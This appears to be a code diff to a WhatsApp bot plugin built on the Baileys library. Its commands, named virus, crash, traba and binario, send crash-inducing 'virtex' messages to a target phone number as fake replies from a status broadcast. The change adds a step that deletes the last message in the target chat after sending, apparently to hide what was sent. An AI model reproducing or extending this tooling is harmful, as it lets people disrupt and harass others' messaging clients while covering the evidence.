@@ -1,7 +1,7 @@
 /*
 import fs from 'fs'
 import fetch from 'node-fetch'
-const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
+const { prepareWAMessageMedia, proto, generateWAMessageFromContent, getLastMessageInChat } = (await import('@adiwajshing/baileys')).default
 
 let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
 let from = ${text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || m.chat}
@@ -90,7 +90,10 @@ case 'virus8': case 'c8': case 'binario8': case 'traba8': case 'crash8': {
 conn.fakeReply(from, virtex10, '0@s.whatsapp.net', '🔥 *By ĐłɆ₲Ø-Ø₣₵ 🔥', 'status@broadcast')}
 break    
 }
-if (from == m.chat) from = 'este chat'    
+const lastMsgInChat = await getLastMessageInChat(from) 
+await conn.chatModify({ delete: true, lastMessages: [{ key: lastMsgInChat.key, messageTimestamp: lastMsgInChat.messageTimestamp }]}, from)
+
+if (from == m.chat) from = 'este chat'   
 m.reply(`*[❗𝐈𝐍𝐅𝐎❗] 𝚂𝙴 𝙴𝙽𝚅𝙸𝙾 𝙲𝙾𝙽 𝙴𝚇𝙸𝚃𝙾 ${command} 𝙰 ${from}*`)
 }
 handler.command = /^(virus1|c1|binario1|traba1|crash1|virus2|c2|binario2|traba2|crash2)$/i
